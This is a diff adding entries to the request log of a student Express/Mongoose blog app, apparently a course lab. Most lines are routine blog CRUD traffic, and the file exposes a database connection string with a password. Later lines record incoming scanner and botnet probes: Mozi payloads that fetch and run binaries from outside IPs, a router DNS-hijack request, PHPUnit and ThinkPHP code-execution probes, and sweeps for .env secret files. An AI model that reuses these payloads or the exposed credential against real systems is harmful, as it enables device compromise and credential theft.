@@ -2171,3 +2171,610 @@ Mongoose disconnected through app termination
 (node:24042) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
 (node:24042) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
 Mongoose connected to mongodb://cjfield:inprison@localhost/blogger
+Getting Blog List
+[0mGET /favicon.ico [36m304 [0m16.272 ms - -[0m
+[
+  {
+    _id: 5fa06f5ca1079d5d61f5e583,
+    blogTitle: 'Day 3',
+    blogText: 'hi',
+    createdOn: 2020-11-02T20:43:08.619Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m35.538 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.822 ms - -[0m
+Getting Blog List
+[
+  {
+    _id: 5fa06f5ca1079d5d61f5e583,
+    blogTitle: 'Day 3',
+    blogText: 'hi',
+    createdOn: 2020-11-02T20:43:08.619Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m5.086 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.641 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.789 ms - -[0m
+[0mPOST /api/login [32m200 [0m64.031 ms - 256[0m
+[0mGET /favicon.ico [36m304 [0m0.770 ms - -[0m
+Getting Blog List
+[
+  {
+    _id: 5fa06f5ca1079d5d61f5e583,
+    blogTitle: 'Day 3',
+    blogText: 'hi',
+    createdOn: 2020-11-02T20:43:08.619Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m2.981 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.622 ms - -[0m
+Finding blog details { blogid: '5fa06f5ca1079d5d61f5e583' }
+{
+  _id: 5fa06f5ca1079d5d61f5e583,
+  blogTitle: 'Day 3',
+  blogText: 'hi',
+  createdOn: 2020-11-02T20:43:08.619Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa06f5ca1079d5d61f5e583 [32m200 [0m4.124 ms - 117[0m
+[0mGET /favicon.ico [36m304 [0m0.675 ms - -[0m
+Finding blog details { blogid: '5fa06f5ca1079d5d61f5e583' }
+{
+  _id: 5fa06f5ca1079d5d61f5e583,
+  blogTitle: 'Day 3',
+  blogText: 'hi',
+  createdOn: 2020-11-02T20:43:08.619Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa06f5ca1079d5d61f5e583 [36m304 [0m2.479 ms - -[0m
+Finding blog details { blogid: '5fa06f5ca1079d5d61f5e583' }
+{
+  _id: 5fa06f5ca1079d5d61f5e583,
+  blogTitle: 'Day 3',
+  blogText: 'hi',
+  createdOn: 2020-11-02T20:43:08.619Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa06f5ca1079d5d61f5e583 [36m304 [0m3.005 ms - -[0m
+[0mPUT /api/blogs/5fa06f5ca1079d5d61f5e583 [32m200 [0m13.924 ms - 123[0m
+Getting Blog List
+[
+  {
+    _id: 5fa06f5ca1079d5d61f5e583,
+    blogTitle: 'Day 3',
+    blogText: 'hi there',
+    createdOn: 2020-11-02T20:43:08.619Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.344 ms - 117[0m
+[0mGET /favicon.ico [36m304 [0m0.657 ms - -[0m
+Finding blog details { blogid: '5fa06f5ca1079d5d61f5e583' }
+{
+  _id: 5fa06f5ca1079d5d61f5e583,
+  blogTitle: 'Day 3',
+  blogText: 'hi there',
+  createdOn: 2020-11-02T20:43:08.619Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa06f5ca1079d5d61f5e583 [32m200 [0m2.855 ms - 123[0m
+[0mGET /favicon.ico [36m304 [0m0.652 ms - -[0m
+Finding blog details { blogid: '5fa06f5ca1079d5d61f5e583' }
+{
+  _id: 5fa06f5ca1079d5d61f5e583,
+  blogTitle: 'Day 3',
+  blogText: 'hi there',
+  createdOn: 2020-11-02T20:43:08.619Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa06f5ca1079d5d61f5e583 [36m304 [0m2.302 ms - -[0m
+Finding blog details { blogid: '5fa06f5ca1079d5d61f5e583' }
+{
+  _id: 5fa06f5ca1079d5d61f5e583,
+  blogTitle: 'Day 3',
+  blogText: 'hi there',
+  createdOn: 2020-11-02T20:43:08.619Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa06f5ca1079d5d61f5e583 [36m304 [0m3.358 ms - -[0m
+Deleting blog entry with id of 5fa06f5ca1079d5d61f5e583
+{}
+[0mDELETE /api/blogs/5fa06f5ca1079d5d61f5e583 [32m204 [0m4.423 ms - -[0m
+Getting Blog List
+[]
+[0mGET /api/blogs [32m200 [0m1.709 ms - 2[0m
+[0mGET /favicon.ico [36m304 [0m0.627 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.776 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.751 ms - -[0m
+Getting Blog List
+[]
+[0mGET /api/blogs [36m304 [0m2.065 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.621 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.778 ms - -[0m
+[0mGET / [32m200 [0m2.409 ms - 4536[0m
+[0mGET /stylesheets/style.css [32m200 [0m1.042 ms - 111[0m
+[0mGET /css/fontawesome-all.css [32m200 [0m2.766 ms - 51609[0m
+[0mGET /js/angular-route.min.js [32m200 [0m2.698 ms - 4595[0m
+[0mGET /bloggerApp.js [32m200 [0m0.677 ms - 5342[0m
+[0mGET /auth/authentication.js [32m200 [0m0.768 ms - 4036[0m
+[0mGET /nav/navigation.js [32m200 [0m0.711 ms - 754[0m
+[0mGET /js/angular-ui-router.min.js [32m200 [0m1.654 ms - 114858[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m7.914 ms - 160302[0m
+[0mGET /js/angular.min.js [32m200 [0m2.399 ms - 158915[0m
+[0mGET /nav/navigation.html [32m200 [0m0.771 ms - 667[0m
+[0mGET / [32m200 [0m0.645 ms - 4536[0m
+[0mGET /js/angular.min.js [32m200 [0m0.890 ms - 158915[0m
+[0mGET /common/auth/login.view.html [32m200 [0m0.753 ms - 1059[0m
+[0mGET /common/auth/register.view.html [32m200 [0m0.770 ms - 1278[0m
+[0mPOST /api/register [32m200 [0m18.352 ms - 257[0m
+[0mGET /favicon.ico [32m200 [0m1.010 ms - 4536[0m
+{ blogTitle: 'Added by Prof Rogers', blogText: 'test' }
+{
+  _id: 5fa077825e4b905dea69c433,
+  blogTitle: 'Added by Prof Rogers',
+  blogText: 'test',
+  createdOn: 2020-11-02T21:17:54.800Z,
+  __v: 0
+}
+[0mPOST /api/blogs/ [32m201 [0m5.408 ms - 134[0m
+Getting Blog List
+[
+  {
+    _id: 5fa077825e4b905dea69c433,
+    blogTitle: 'Added by Prof Rogers',
+    blogText: 'test',
+    createdOn: 2020-11-02T21:17:54.800Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.102 ms - 128[0m
+[0mGET /webfonts/fa-solid-900.woff2 [32m200 [0m0.776 ms - 50372[0m
+Getting Blog List
+[
+  {
+    _id: 5fa077825e4b905dea69c433,
+    blogTitle: 'Added by Prof Rogers',
+    blogText: 'test',
+    createdOn: 2020-11-02T21:17:54.800Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.343 ms - 128[0m
+Finding blog details { blogid: '5fa077825e4b905dea69c433' }
+{
+  _id: 5fa077825e4b905dea69c433,
+  blogTitle: 'Added by Prof Rogers',
+  blogText: 'test',
+  createdOn: 2020-11-02T21:17:54.800Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa077825e4b905dea69c433 [32m200 [0m2.567 ms - 134[0m
+Finding blog details { blogid: '5fa077825e4b905dea69c433' }
+{
+  _id: 5fa077825e4b905dea69c433,
+  blogTitle: 'Added by Prof Rogers',
+  blogText: 'test',
+  createdOn: 2020-11-02T21:17:54.800Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa077825e4b905dea69c433 [36m304 [0m1.945 ms - -[0m
+Finding blog details { blogid: '5fa077825e4b905dea69c433' }
+{
+  _id: 5fa077825e4b905dea69c433,
+  blogTitle: 'Added by Prof Rogers',
+  blogText: 'test',
+  createdOn: 2020-11-02T21:17:54.800Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa077825e4b905dea69c433 [36m304 [0m1.948 ms - -[0m
+[0mPUT /api/blogs/5fa077825e4b905dea69c433 [32m200 [0m4.307 ms - 136[0m
+Getting Blog List
+[
+  {
+    _id: 5fa077825e4b905dea69c433,
+    blogTitle: 'Added by Prof Rogers!',
+    blogText: 'test!',
+    createdOn: 2020-11-02T21:17:54.800Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.412 ms - 130[0m
+Finding blog details { blogid: '5fa077825e4b905dea69c433' }
+{
+  _id: 5fa077825e4b905dea69c433,
+  blogTitle: 'Added by Prof Rogers!',
+  blogText: 'test!',
+  createdOn: 2020-11-02T21:17:54.800Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa077825e4b905dea69c433 [32m200 [0m2.524 ms - 136[0m
+Finding blog details { blogid: '5fa077825e4b905dea69c433' }
+{
+  _id: 5fa077825e4b905dea69c433,
+  blogTitle: 'Added by Prof Rogers!',
+  blogText: 'test!',
+  createdOn: 2020-11-02T21:17:54.800Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa077825e4b905dea69c433 [36m304 [0m1.822 ms - -[0m
+Finding blog details { blogid: '5fa077825e4b905dea69c433' }
+{
+  _id: 5fa077825e4b905dea69c433,
+  blogTitle: 'Added by Prof Rogers!',
+  blogText: 'test!',
+  createdOn: 2020-11-02T21:17:54.800Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa077825e4b905dea69c433 [36m304 [0m6.755 ms - -[0m
+Deleting blog entry with id of 5fa077825e4b905dea69c433
+{}
+[0mDELETE /api/blogs/5fa077825e4b905dea69c433 [32m204 [0m3.405 ms - -[0m
+Getting Blog List
+[]
+[0mGET /api/blogs [32m200 [0m1.640 ms - 2[0m
+[0mGET / [32m200 [0m0.826 ms - 4536[0m
+[0mGET / [32m200 [0m0.708 ms - 4536[0m
+[0mGET /hudson [32m200 [0m0.850 ms - 4536[0m
+[0mGET / [32m200 [0m0.743 ms - 4536[0m
+[0mGET / [32m200 [0m0.675 ms - 4536[0m
+[0mGET /.env [32m200 [0m0.965 ms - 4536[0m
+[0mGET /vendor/.env [32m200 [0m1.506 ms - 4536[0m
+[0mGET /storage/.env [32m200 [0m0.842 ms - 4536[0m
+[0mGET /public/.env [32m200 [0m0.820 ms - 4536[0m
+[0mPOST / [32m200 [0m1.373 ms - 4536[0m
+[0mGET /config/getuser?index=0 [32m200 [0m0.852 ms - 4536[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.89.42.103:52199/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200 [0m0.899 ms - 4536[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://115.50.224.242:39052/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [32m200 [0m0.860 ms - 4536[0m
+[0mGET /.env [32m200 [0m0.812 ms - 4536[0m
+[0mPOST / [32m200 [0m0.738 ms - 4536[0m
+[0mGET / [32m200 [0m0.697 ms - 4536[0m
+[0mGET / [32m200 [0m0.681 ms - 4536[0m
+[0mGET / [32m200 [0m0.690 ms - 4536[0m
+[0mGET /boaform/admin/formLogin?username=user&psd=user [32m200 [0m0.882 ms - 4536[0m
+[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.896 ms - 4536[0m
+[0mPOST /api/jsonws/invoke [32m200 [0m0.865 ms - 4536[0m
+[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.815 ms - 4536[0m
+[0mGET /solr/admin/info/system?wt=json [32m200 [0m1.408 ms - 4536[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [32m200 [0m0.845 ms - 4536[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.560 ms - 4536[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.701 ms - 4536[0m
+[0mGET /wp-content/plugins/wp-file-manager/readme.txt [32m200 [0m0.756 ms - 4536[0m
+[0mGET /console/ [32m200 [0m0.878 ms - 4536[0m
+[0mGET /debug_gate.php [32m200 [0m0.915 ms - 4536[0m
+[0mPOST /GponForm/diag_Form?images/ [0m- [0m- ms - -[0m
+Error: Failed to lookup view "error" in views directory "/home/bitnami/Lab6/app_server/views"
+    at Function.render (/home/bitnami/Lab6/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/home/bitnami/Lab6/node_modules/express/lib/response.js:1008:7)
+    at /home/bitnami/Lab6/app.js:57:7
+    at Layer.handle_error (/home/bitnami/Lab6/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/Lab6/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:275:10)
+    at Layer.handle_error (/home/bitnami/Lab6/node_modules/express/lib/router/layer.js:67:12)
+    at trim_prefix (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/Lab6/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:275:10)
+    at /home/bitnami/Lab6/node_modules/express/lib/response.js:435:7
+    at onerror (/home/bitnami/Lab6/node_modules/express/lib/response.js:1040:5)
+    at Array.onfinish (/home/bitnami/Lab6/node_modules/express/lib/response.js:1058:21)
+[0mGET / [32m200 [0m1.661 ms - 4536[0m
+[0mGET / [32m200 [0m0.765 ms - 4536[0m
+[0mPOST /GponForm/diag_Form?images/ [0m- [0m- ms - -[0m
+Error: Failed to lookup view "error" in views directory "/home/bitnami/Lab6/app_server/views"
+    at Function.render (/home/bitnami/Lab6/node_modules/express/lib/application.js:580:17)
+    at ServerResponse.render (/home/bitnami/Lab6/node_modules/express/lib/response.js:1008:7)
+    at /home/bitnami/Lab6/app.js:57:7
+    at Layer.handle_error (/home/bitnami/Lab6/node_modules/express/lib/router/layer.js:71:5)
+    at trim_prefix (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/Lab6/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:275:10)
+    at Layer.handle_error (/home/bitnami/Lab6/node_modules/express/lib/router/layer.js:67:12)
+    at trim_prefix (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:315:13)
+    at /home/bitnami/Lab6/node_modules/express/lib/router/index.js:284:7
+    at Function.process_params (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:335:12)
+    at next (/home/bitnami/Lab6/node_modules/express/lib/router/index.js:275:10)
+    at /home/bitnami/Lab6/node_modules/express/lib/response.js:435:7
+    at onerror (/home/bitnami/Lab6/node_modules/express/lib/response.js:1040:5)
+    at Array.onfinish (/home/bitnami/Lab6/node_modules/express/lib/response.js:1058:21)
+[0mGET / [32m200 [0m0.667 ms - 4536[0m
+[0mGET / [32m200 [0m0.797 ms - 4536[0m
+[0mGET / [32m200 [0m0.534 ms - 4536[0m
+[0mGET / [32m200 [0m0.680 ms - 4536[0m
+[0mGET / [32m200 [0m0.725 ms - 4536[0m
+[0mGET /portal/redlion [32m200 [0m0.861 ms - 4536[0m
+[0mGET /ReportServer [32m200 [0m0.888 ms - 4536[0m
+[0mGET / [32m200 [0m0.638 ms - 4536[0m
+[0mGET /ErKNDtwEzynKq/index.php [32m200 [0m0.895 ms - 4536[0m
+[0mGET /TfKW [32m200 [0m0.835 ms - 4536[0m
+[0mGET / [32m200 [0m0.709 ms - 4536[0m
+[0mGET /.env [32m200 [0m0.755 ms - 4536[0m
+[0mPOST / [32m200 [0m0.688 ms - 4536[0m
+[0mGET / [32m200 [0m0.719 ms - 4536[0m
+[0mGET / [32m200 [0m0.756 ms - 4536[0m
+[0mGET /050XNFeuojFKn6rs/index.php [32m200 [0m0.815 ms - 4536[0m
+[0mGET http://httpheader.net/azenv.php [32m200 [0m3.939 ms - 4536[0m
+[0mGET /wp-login.php [32m200 [0m0.875 ms - 4536[0m
+[0mGET / [32m200 [0m0.712 ms - 4536[0m
+[0mGET /dnscfg.cgi?dnsPrimary=149.56.152.185&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1 [32m200 [0m0.910 ms - 4536[0m
+[0mGET / [32m200 [0m0.952 ms - 4536[0m
+[0mGET /0bef [32m200 [0m0.829 ms - 4536[0m
+[0mGET /.env [32m200 [0m0.809 ms - 4536[0m
+[0mPOST / [32m200 [0m0.842 ms - 4536[0m
+[0mGET / [32m200 [0m0.732 ms - 4536[0m
+[0mGET / [32m200 [0m0.672 ms - 4536[0m
+[0mHEAD / [32m200 [0m0.524 ms - 4536[0m
+[0mGET /.env [32m200 [0m0.800 ms - 4536[0m
+[0mPOST / [32m200 [0m0.865 ms - 4536[0m
+[0mGET / [32m200 [0m0.708 ms - 4536[0m
+[0mGET /.env [32m200 [0m0.822 ms - 4536[0m
+[0mPOST / [32m200 [0m0.809 ms - 4536[0m
+[0mGET / [32m200 [0m0.693 ms - 4536[0m
+[0mGET /config/getuser?index=0 [32m200 [0m0.793 ms - 4536[0m
+[0mGET / [32m200 [0m0.799 ms - 4536[0m
+[0mGET / [32m200 [0m0.683 ms - 4536[0m
+[0mGET / [32m200 [0m0.680 ms - 4536[0m
+[0mGET /dnscfg.cgi?dnsPrimary=149.56.152.185&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1 [32m200 [0m0.896 ms - 4536[0m
+[0mGET / [32m200 [0m0.559 ms - 4536[0m
+[0mGET / [32m200 [0m0.710 ms - 4536[0m
+[0mGET /.env [32m200 [0m0.669 ms - 4536[0m
+[0mGET /.remote [32m200 [0m0.617 ms - 4536[0m
+[0mGET /.local [32m200 [0m0.647 ms - 4536[0m
+[0mGET /.production [32m200 [0m0.600 ms - 4536[0m
+[0mGET //vendor/.env [32m200 [0m0.641 ms - 4536[0m
+[0mGET //lib/.env [32m200 [0m0.674 ms - 4536[0m
+[0mGET //lab/.env [32m200 [0m0.630 ms - 4536[0m
+[0mGET //cronlab/.env [32m200 [0m0.633 ms - 4536[0m
+[0mGET //cron/.env [32m200 [0m0.605 ms - 4536[0m
+[0mGET //bot/.env [32m200 [0m0.642 ms - 4536[0m
+[0mGET //include/.env [32m200 [0m0.676 ms - 4536[0m
+[0mGET //data/.env [32m200 [0m0.618 ms - 4536[0m
+[0mGET //config/.env [32m200 [0m1.421 ms - 4536[0m
+[0mGET //cfg/.env [32m200 [0m0.714 ms - 4536[0m
+[0mGET //core/.env [32m200 [0m0.660 ms - 4536[0m
+[0mGET //core/app/.env [32m200 [0m0.603 ms - 4536[0m
+[0mGET //core/Datavase/.env [32m200 [0m0.633 ms - 4536[0m
+[0mGET //database/.env [32m200 [0m0.645 ms - 4536[0m
+[0mGET //config/.env [32m200 [0m0.643 ms - 4536[0m
+[0mGET //assets/.env [32m200 [0m0.618 ms - 4536[0m
+[0mGET //app/.env [32m200 [0m0.605 ms - 4536[0m
+[0mGET //apps/.env [32m200 [0m0.560 ms - 4536[0m
+[0mGET //uploads/.env [32m200 [0m0.605 ms - 4536[0m
+[0mGET //sitemaps/.env [32m200 [0m1.491 ms - 4536[0m
+[0mGET //saas/.env [32m200 [0m0.667 ms - 4536[0m
+[0mGET //api/.env [32m200 [0m0.625 ms - 4536[0m
+[0mGET //psnlink/.env [32m200 [0m0.622 ms - 4536[0m
+[0mGET //exapi/.env [32m200 [0m0.623 ms - 4536[0m
+[0mGET //site/.env [32m200 [0m0.627 ms - 4536[0m
+[0mGET //admin/.env [32m200 [0m0.628 ms - 4536[0m
+[0mGET //web/.env [32m200 [0m0.636 ms - 4536[0m
+[0mGET //public/.env [32m200 [0m0.606 ms - 4536[0m
+[0mGET //en/.env [32m200 [0m0.657 ms - 4536[0m
+[0mGET //sandbox/.env [32m200 [0m0.617 ms - 4536[0m
+[0mGET //beta/.env [32m200 [0m1.467 ms - 4536[0m
+[0mGET //tools/.env [32m200 [0m0.650 ms - 4536[0m
+[0mGET //v1/.env [32m200 [0m0.647 ms - 4536[0m
+[0mGET //v2/.env [32m200 [0m0.633 ms - 4536[0m
+[0mGET //administrator/.env [32m200 [0m0.637 ms - 4536[0m
+[0mGET //drupal/.env [32m200 [0m0.604 ms - 4536[0m
+[0mGET //wp/.env [32m200 [0m0.607 ms - 4536[0m
+[0mGET //ci/.env [32m200 [0m0.627 ms - 4536[0m
+[0mGET //laravel/.env [32m200 [0m0.630 ms - 4536[0m
+[0mPOST / [32m200 [0m0.704 ms - 4536[0m
+[0mPOST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.503 ms - 4536[0m
+[0mPOST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m1.334 ms - 4536[0m
+[0mPOST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.480 ms - 4536[0m
+[0mPOST //beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.455 ms - 4536[0m
+[0mPOST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.476 ms - 4536[0m
+[0mPOST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.452 ms - 4536[0m
+[0mPOST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.458 ms - 4536[0m
+[0mPOST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.461 ms - 4536[0m
+[0mPOST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.472 ms - 4536[0m
+[0mPOST //lib/phpunit/Util/PHP/eval-stdin.php [32m200 [0m0.480 ms - 4536[0m
+[0mPOST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php [32m200 [0m0.487 ms - 4536[0m
+[0mPOST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.478 ms - 4536[0m
+[0mPOST //lib/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.456 ms - 4536[0m
+[0mPOST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.461 ms - 4536[0m
+[0mPOST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.445 ms - 4536[0m
+[0mPOST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.457 ms - 4536[0m
+[0mPOST //phpunit/Util/PHP/eval-stdin.php [32m200 [0m0.450 ms - 4536[0m
+[0mPOST //phpunit/phpunit/Util/PHP/eval-stdin.php [32m200 [0m0.449 ms - 4536[0m
+[0mPOST //phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.451 ms - 4536[0m
+[0mPOST //phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.431 ms - 4536[0m
+[0mPOST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.425 ms - 4536[0m
+[0mPOST //sandbox/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.459 ms - 4536[0m
+[0mPOST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.467 ms - 4536[0m
+[0mPOST //v1/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.446 ms - 4536[0m
+[0mPOST //v2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.457 ms - 4536[0m
+[0mPOST //vendor/phpunit/Util/PHP/eval-stdin.php [32m200 [0m0.473 ms - 4536[0m
+[0mPOST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php [32m200 [0m0.474 ms - 4536[0m
+[0mPOST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.427 ms - 4536[0m
+[0mPOST //vendor/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.439 ms - 4536[0m
+[0mPOST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.434 ms - 4536[0m
+[0mPOST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m1.451 ms - 4536[0m
+[0mPOST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.443 ms - 4536[0m
+[0mPOST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.451 ms - 4536[0m
+[0mPOST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.475 ms - 4536[0m
+[0mGET /1zz7 [32m200 [0m0.838 ms - 4536[0m
+[0mGET / [32m200 [0m0.745 ms - 4536[0m
+[0mGET /.env [32m200 [0m4.098 ms - 4536[0m
+[0mPOST / [32m200 [0m0.814 ms - 4536[0m
+[0mGET /dnscfg.cgi?dnsPrimary=149.56.152.185&dnsSecondary8.8.4.4&dnsDynamic=0&dnsRefresh=1 [32m200 [0m4.632 ms - 4536[0m
+[0mGET / [32m200 [0m0.556 ms - 4536[0m
+[0mGET /config/getuser?index=0 [32m200 [0m0.732 ms - 4536[0m
+[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.841 ms - 4536[0m
+[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.721 ms - 4536[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.652 ms - 4536[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.474 ms - 4536[0m
+[0mGET /solr/admin/info/system?wt=json [32m200 [0m0.833 ms - 4536[0m
+[0mPOST /api/jsonws/invoke [32m200 [0m0.899 ms - 4536[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [32m200 [0m1.550 ms - 4536[0m
+[0mGET /wp-content/plugins/wp-file-manager/readme.txt [32m200 [0m0.690 ms - 4536[0m
+[0mGET /console/ [32m200 [0m0.761 ms - 4536[0m
+[0mGET / [32m200 [0m0.747 ms - 4536[0m
+[0mGET / [32m200 [0m0.671 ms - 4536[0m
+[0mGET /portal/redlion [32m200 [0m0.870 ms - 4536[0m
+[0mGET /config/getuser?index=0 [32m200 [0m0.780 ms - 4536[0m
+[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.141.91.239:45815/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [32m200 [0m0.851 ms - 4536[0m
+[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://115.59.88.111:46676/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [32m200 [0m0.849 ms - 4536[0m
+[0mGET / [32m200 [0m0.662 ms - 4536[0m
+[0mGET / [32m200 [0m0.673 ms - 4536[0m
+[0mGET /phpmyadmin/index.php?lang=en [32m200 [0m0.831 ms - 4536[0m
+[0mGET / [32m200 [0m0.673 ms - 4536[0m
+[0mGET /solr/admin/info/system?wt=json [32m200 [0m0.879 ms - 4536[0m
+[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.573 ms - 4536[0m
+[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 [32m200 [0m0.730 ms - 4536[0m
+[0mPOST /api/jsonws/invoke [32m200 [0m0.816 ms - 4536[0m
+[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.817 ms - 4536[0m
+[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [32m200 [0m0.851 ms - 4536[0m
+[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.668 ms - 4536[0m
+[0mGET /wp-content/plugins/wp-file-manager/readme.txt [32m200 [0m0.729 ms - 4536[0m
+[0mGET /console/ [32m200 [0m0.704 ms - 4536[0m
+[0mGET / [32m200 [0m0.755 ms - 4536[0m
+[0mGET / [32m200 [0m0.539 ms - 4536[0m
+[0mGET / [32m200 [0m0.651 ms - 4536[0m
+[0mGET http://httpheader.net/azenv.php [32m200 [0m0.808 ms - 4536[0m
+[0mGET /config/getuser?index=0 [32m200 [0m0.839 ms - 4536[0m
+[0mGET http://example.com/ [32m200 [0m0.750 ms - 4536[0m
+[0mGET / [32m200 [0m0.698 ms - 4536[0m
+[0mGET / [32m200 [0m0.699 ms - 4536[0m
+[0mHEAD / [32m200 [0m0.459 ms - 4536[0m
